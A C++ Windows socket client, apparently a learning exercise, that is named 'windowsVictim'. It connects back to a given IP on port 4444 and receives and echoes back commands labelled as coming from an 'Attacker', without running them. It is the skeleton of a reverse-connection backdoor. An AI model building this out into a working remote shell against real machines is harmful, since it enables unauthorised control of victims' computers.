#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>

#define PORT 4444
#define BUFFERSIZE 4096
#define SERVER_STATUS_CLOSED "Connection closed by server"

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << "Please use \"./windowsVictim [ip]\"\n";
        return 1;
    }
    sockaddr_in serverAddress;
    WSADATA wsa;
    char buffer[BUFFERSIZE];
    SOCKET sock = INVALID_SOCKET;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
        perror("WSAStartup failed\n");
        return 1;
    } else {
        std::cout << "WSAStartup created\n";
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET) {
        perror("Socket failed to create\n");
        WSACleanup();
        return 1;
    } else {
        std::cout << "Socket created\n";
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    
    std::string serverip = argv[1];

    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
        std::cout << "invalid ip address\n";
        return 1;
    }

    if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << "Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << "Connection established\n";
    }

    while(true) {
        int type;
        int bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == 1) {
            memset(buffer, 0, BUFFERSIZE);

            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }
        std::string cmd(buffer);
        std::cout << "Attacker: " << cmd << std::endl;

        std::string clientMessage = "\nClient received: " + cmd;
        send(sock, clientMessage.c_str(), clientMessage.size(), 0);

        }

        if(type == 3) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}